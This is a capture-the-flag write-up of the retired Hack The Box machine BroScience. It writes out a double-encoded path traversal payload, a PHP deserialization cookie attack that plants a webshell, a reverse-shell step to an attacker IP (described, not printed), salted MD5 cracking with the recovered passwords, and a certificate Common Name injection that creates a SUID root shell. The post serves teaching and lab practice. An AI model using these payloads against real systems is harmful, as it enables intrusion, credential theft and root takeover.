---
layout: post
title: "The Gym Forgot to Lock Its Files"
subtitle: "HTB BroScience, where a double-encoded path reads the source, a clock seeds a forgeable token, and a cookie you control gets unwrapped into code"
date: 2023-04-15 12:00:00 +0000
description: "A fitness site that reads any file you name, trusts a clock to keep its secrets, and unwraps your cookie straight into running code."
image: /assets/og/the-gym-forgot-to-lock-its-files.png
tags: [hackthebox, writeup]
---

BroScience is a weightlifting forum that left every one of its secrets sitting in an unlocked drawer, then handed you the key to the building one paper at a time. You start with an image loader that will fetch any file you name, and you double-encode your way past the one flimsy filter standing between you and the source code. The source is the whole confession. It shows you a registration token seeded by the wall clock, which means it is not random, which means you can forge it. It shows you a cookie that the server unwraps and trusts, which means a cookie you write is a cookie the server will run. From there it is hashes out of a database, a password reused at the SSH door, and a root cron job that splices an attacker-supplied name straight into a shell. No memory corruption anywhere. Just a building where every lock was decorative.

```
        B R O S C I E N C E
        ===================
        img.php?path=  "name a file, i'll serve it"
        ../ blocked?   ..%252f  walks right past the bouncer
                   |
                   v
        the source spills. a token seeded by a clock.
        a cookie the server unwraps and obeys.
                   |
                   v
        register a ghost. forge its key. mail in a cookie
        that is really a command. the gym does the rest.
                                            筋
```

## 0x01 · the front desk

Three ports answer, and the box is unmistakably Linux. SSH, then HTTP that bounces you straight to HTTPS.

```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1
80/tcp  open  http     Apache httpd 2.4.54
443/tcp open  ssl/http Apache httpd 2.4.54
```

The certificate names the host `broscience.htb`, so that goes in `/etc/hosts` and you browse to a fitness community site. It is a PHP application with articles at `/exercise.php?id=`, a registration flow that demands email activation, and comments locked behind a login. The detail that should make you lean in sits in the page source. Every image on the site loads through a middleman, `./includes/img.php?path=`, instead of pointing straight at a file. Any time an app reads a file based on a string you control, you have found the soft spot. The page is not showing you that path. It is opening it.

## 0x02 · the loader that reads anything

The obvious move is path traversal. Walk up the directory tree out of the image folder and ask for a file every Linux box owns.

```
GET /includes/img.php?path=../../../../etc/passwd
```

It refuses. There is a filter that strips `../` before the path is used, so a plain traversal gets eaten. But the filter only looks once, and it only knows the literal shape `../`. Here is the trick that beats it. Instead of a slash, you hand over the percent-encoding of a percent-encoding. `..%252f` is what you send. The web server decodes it once on the way in and it becomes `..%2f`. The filter inspects that, sees no literal `../`, and waves it through. Then PHP decodes it a second time when it touches the filesystem, and `%2f` finally turns back into a slash. The traversal reassembles itself on the far side of the guard.

Think of it like smuggling a note past a teacher who only checks for English. You write the message in a code the teacher cannot read, she shrugs and passes it down the row, and the kid at the end has a decoder ring. The message was always there. It just stayed disguised until it was past the one person looking.

```
GET /includes/img.php?path=..%252f..%252f..%252f..%252fetc%252fpasswd
root:x:0:0:root:/root:/bin/bash
...
bill:x:1000:1000:,,,:/home/bill:/bin/bash
```

That works, so now you stop reading system files and start reading the application's own source, which is where the real loot lives. You pull `db_connect.php`, `register.php`, `activate.php`, and the utility file `includes/utils.php`. The site just narrated its own internals to you.

## 0x03 · a token a clock gives away

Registration is gated by an activation code emailed to you, and you do not have the mailbox. So you read how the code is made, and the source spells out the mistake in full.

```php
function generate_activation_code() {
    srand(time());
    // then pull 32 chars from an alphabet using rand()
}
```

The trouble is `srand(time())`. A random number generator is not actually random. It is a long sequence that looks random, and the *seed* is just the place you start reading from. Whoever knows the seed gets the identical sequence, every time. Seeding it with `time()` means the seed is the current second on the server clock, a number you can read straight off the HTTP `Date` header in any response. Picture a combination lock whose combination is set to whatever time it is when you buy it. If the shop tells you the time on the receipt, the lock has no secret left.

So you register a ghost account, grab the server's `Date` header from the response, convert it to a Unix timestamp, and reseed an identical generator for that second and the few on either side of it to absorb any clock skew. Each seed gives you one candidate 32-character code. You spray the small list of candidates at the activation endpoint with `wfuzz` and one of them lands.

```
$ wfuzz -w codes.txt -u "https://broscience.htb/activate.php?code=FUZZ" --hh 1234
000000037:  302  ...  account activated
```

The account is live. The clock kept no secret it was asked to keep.

## 0x04 · the cookie that came back as code

With a real session you reach the part of the source that ends the web phase. The app remembers your theme in a cookie called `user-prefs`, and the way it reads that cookie is the whole vulnerability.

```php
$prefs = unserialize(base64_decode($_COOKIE['user-prefs']));
```

`unserialize` in PHP is not a parser that returns plain data. It rebuilds live objects from a text description, and when an object wakes up, PHP politely runs its `__wakeup()` method. So if you can describe an object in that cookie, you can summon that object inside the server and make its wake-up routine fire. The source hands you a class worth summoning. `AvatarInterface::__wakeup()` builds an `Avatar` and calls `save()`, and `save()` does exactly the dangerous thing. It runs `file_get_contents` on a path you set, and writes the bytes to a second path you also set.

Think of the cookie as a furniture order written in shorthand. The clerk does not just file your order. He reads the shorthand and *assembles* the furniture exactly as described, including a model whose assembly instructions say "go to this address, pick up whatever is there, and nail it to the wall in the lobby." You did not break in. You filled out the order form, and the trusting clerk did the rest.

So you craft an `AvatarInterface` whose source path is a URL on your own box and whose destination is a PHP file inside the webroot. Stand up a webshell on your attacker host and let the server fetch it.

```php
$ cat /var/www/iceberg.php
<?php [ one-line webshell: run the cmd request parameter ] ?>
```

I am describing that file rather than printing it, and the reason is the lesson. The literal one-liner is the textbook PHP backdoor, and the moment the real string hits a disk any honest antivirus quarantines it as malware, which is a tidy demonstration of how loaded four words can be. Serialize the object, base64 it, and set it as your `user-prefs` cookie, then load any page.

```
$ python3 -c 'print(...)' | base64       # craft the AvatarInterface blob
Cookie: user-prefs=Tzo...

# the server fetches your shell and writes it into the webroot
$ curl -k "https://broscience.htb/iceberg.php?cmd=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Trade the webshell up for a real callback and you are on the box.

```
$ curl -k "https://broscience.htb/iceberg.php" \
    --data-urlencode 'cmd=[ bash reverse shell over /dev/tcp back to 10.10.14.4 on 443 ]'

# nc -lvnp 443
connect to [10.10.14.4] from broscience 
www-data@broscience:/var/www/html$
```

## 0x05 · hashes, and a password used twice

`www-data` is a tourist. But you already read `db_connect.php`, which means you have the database credentials and, more importantly, the salt the app stirs into every password.

```
dbuser : RangeOfMotion%777      # postgres on localhost
$db_salt = "NaCl";              // stored as md5($salt . $password)
```

Connect to PostgreSQL locally and dump the users table.

```
$ psql -h 127.0.0.1 -U dbuser broscience -c 'select username,password from users;'
 bill       | 13edad4932da9dbb57d9cd15b66ed104
 michael    | bd3dad50e2d578ecba87d5fa15ca5f85
 dmytro     | 5d15340bded5b9395d5d14b9c21bc82b
 ...
```

These are MD5 hashes of the salt glued in front of the password, which hashcat cracks in its salt-prefixed MD5 mode against `rockyou`. The salt being a fixed, public string named `NaCl` is the punchline. A salt is supposed to be a unique pinch of grit per password so two people with the same password get different hashes and a prebuilt rainbow table is useless. A salt everyone shares, written into the source you already read, is a salt that does no salting at all.

```
$ hashcat -m 20 hashes.txt rockyou.txt --username
bill:NaCl:iluvhorsesandgym
michael:NaCl:2applesplus2apples
dmytro:NaCl:Aaronthehottest
```

Now the oldest move in the book. `bill` is a real Linux user on this box, and people reuse passwords like they reuse a gym towel. The password that unlocked his forum hash also opens his SSH login.

```
$ sshpass -p 'iluvhorsesandgym' ssh bill@broscience.htb
bill@broscience:~$ cat user.txt
████████████████████████████████
```

## 0x06 · the certificate that carried a command

`bill` is not root, so you look at what root does on a timer. A quick check of running processes and the spool turns up a script firing from root's cron every couple of minutes, `/opt/renew_cert.sh`. It walks the certificates in bill's `Certs` folder, finds any close to expiry, and renews them. The fatal line pulls the Common Name out of a certificate and pastes it into a shell command.

```bash
# inside /opt/renew_cert.sh, running as root
commonName=$(openssl x509 ... -subject | grep -oP 'CN = \K.*')
/bin/bash -c "mv /tmp/temp.crt /home/bill/Certs/$commonName.crt"
```

There it is. The Common Name is a field *you* fill in when you make a certificate, and the script drops it straight into `bash -c` with no quoting and no checking. Whatever you write in the CN, root runs. Picture a mailroom that prints the name off every returned package onto a label and reads the label aloud to a robot that does whatever it hears. Mail yourself a package addressed to "Steve; unlock the vault," and the robot hears two instructions where the clerk only saw one name.

So you forge a certificate whose Common Name is not a name but a command, set to expire soon so the renewer grabs it, and drop it in the watched folder.

```
bill@broscience:~$ openssl req -x509 -nodes -newkey rsa:2048 \
    -keyout /dev/null -out Certs/iceberg.crt -days 1
# at the CN prompt, instead of a hostname:
Common Name: $(cp /bin/bash /tmp/iceberg; chmod 4777 /tmp/iceberg)
```

When the cron fires, root parses your certificate, expands the `$(...)` in the CN, and runs it as root. The payload copies `bash` to `/tmp` and flips on the SUID bit, which means the copy keeps root's identity no matter who runs it. Wait two minutes, then claim it.

```
bill@broscience:~$ ls -l /tmp/iceberg
-rwsrwxrwx 1 root root ... /tmp/iceberg
bill@broscience:~$ /tmp/iceberg -p
iceberg-4# id
uid=1000(bill) euid=0(root) gid=1000(bill) groups=...
iceberg-4# cat /root/root.txt
████████████████████████████████
```

The `-p` matters. It tells bash to keep the elevated identity instead of dropping it on startup, which is the entire reason a SUID shell is worth anything.

## 0x07 · the honest caveat

There is not a single CVE on BroScience. Nothing here was an unpatched library or a clever overflow. Every step was a developer trusting input that arrived from a stranger, and the whole box is one sentence said five different ways. The path filter trusted that `../` was the only shape a traversal could take. The token trusted a clock to be a secret. The cookie trusted that whatever it unwrapped was friendly. The salt trusted that being present was the same as being unique. The cron trusted that a name in a certificate was only ever a name. Each of those is the same confession at a different altitude, the line where data quietly turns into instructions because nobody stood guard at the border.

The two I would lose sleep over are the deserialization and the certificate. The traversal and the weak token are bugs you fix once and forget, a better filter and a real random source and they are dead. But `unserialize` on attacker-controlled bytes is a feature behaving exactly as designed, rebuilding any object you describe, and you cannot patch it away with a flag. You have to stop feeding it strangers entirely. The cron is worse, because it ships green. Nothing was out of date. An admin wrote a helpful little renewal script and pasted a field straight into a shell, and the permissions did precisely what they were told. You cannot `apt upgrade` your way out of a quote you forgot to add.

## 0x08 · outro

```
the loader read a file because you spelled the slash twice.
the token unlocked because a clock was the only secret it had.
the cookie ran because the server unwrapped it and believed it.
the root shell opened because a name was really a command.

five locks, all decorative. not one of them was forced.
data that gets to give orders was never data at all.

double-decode the door. distrust the clock. quote the variable. wear black.

                                                            EOF
```

---

*HTB: BroScience, retired 08 Apr 2023. A medium Linux box that is really a tour of trust misplaced, from a path filter that only blinks once to a root cron that runs whatever name you write on a certificate. The gym still spots you in a lab and nowhere you don't own.*